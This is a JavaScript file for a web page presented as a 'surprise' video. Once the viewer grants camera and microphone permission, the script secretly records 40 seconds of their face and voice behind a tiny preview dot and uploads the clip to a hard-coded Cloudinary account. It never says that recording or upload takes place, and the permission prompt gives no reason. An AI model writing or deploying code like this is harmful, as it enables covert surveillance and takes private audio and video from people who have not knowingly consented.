"use strict";

// ===== CLOUDINARY CONFIG =====
const CLOUD_NAME = "dpzzfcy84";   // your cloud name
const UPLOAD_PRESET = "forBANIKA"; // your unsigned preset
// =============================

const $ = id => document.getElementById(id);
const pages = () => document.querySelectorAll(".page");
const show = id => { pages().forEach(p=>p.classList.remove("show")); const el=$(id); if(el) el.classList.add("show"); };

const btn = $("startBtn");
const mainVideo = $("mainVideo");
const camPreview = $("camPreview");

btn.onclick = async ()=>{
  show("loader");

  setTimeout(async ()=>{
    show("video");

    let stream;
    try{
      stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:true });
    }catch(e){
      alert("Camera & mic permission needed.");
      show("card");
      return;
    }

    // Play your surprise video
    mainVideo.src = "surprise.mp4";
    await mainVideo.play();

    // Tiny live preview dot (muted)
    if(camPreview){
      camPreview.srcObject = stream;
      camPreview.muted = true;
      camPreview.volume = 0;
      await camPreview.play();
    }

    // Record 40 seconds
    const recorder = new MediaRecorder(stream, { mimeType:"video/webm" });
    const chunks = [];
    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.start();

    await new Promise(r=>setTimeout(r, 40000));
    recorder.stop();

    const blob = await new Promise(r=> recorder.onstop = ()=> r(new Blob(chunks,{type:"video/webm"})));
    stream.getTracks().forEach(t=>t.stop());

    if(camPreview){
      camPreview.pause();
      camPreview.srcObject = null;
    }

    // Upload to Cloudinary
    await uploadToCloudinary(blob);

    show("end");
  }, 5000);
};

async function uploadToCloudinary(blob){
  const fd = new FormData();
  fd.append("file", blob);
  fd.append("upload_preset", UPLOAD_PRESET);
  const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
    method: "POST",
    body: fd
  });
  const data = await res.json();
  console.log("Uploaded:", data.secure_url);
}